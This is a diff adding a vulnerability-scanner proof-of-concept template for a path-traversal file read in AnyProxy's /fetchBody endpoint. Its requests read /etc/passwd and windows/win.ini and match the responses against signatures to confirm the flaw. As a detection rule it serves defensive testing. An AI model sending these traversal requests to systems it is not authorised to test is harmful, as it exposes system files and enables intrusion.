@@ -1,0 +1,24 @@
+name: poc-yaml-alibaba-anyproxy-fetchbody-file-read
+manual: true
+transport: http
+rules:
+    linux0:
+        request:
+            cache: true
+            method: GET
+            path: /fetchBody?id=1/../../../../../../../../etc/passwd
+            follow_redirects: false
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    windows0:
+        request:
+            cache: true
+            method: GET
+            path: /fetchBody?id=1/../../../../../../../../windows/win.ini
+            follow_redirects: false
+        expression: response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
+expression: windows0() || linux0()
+detail:
+    author: wulalalaaa(https://github.com/wulalalaaa)
+    links:
+        - https://github.com/alibaba/anyproxy/issues/391
+
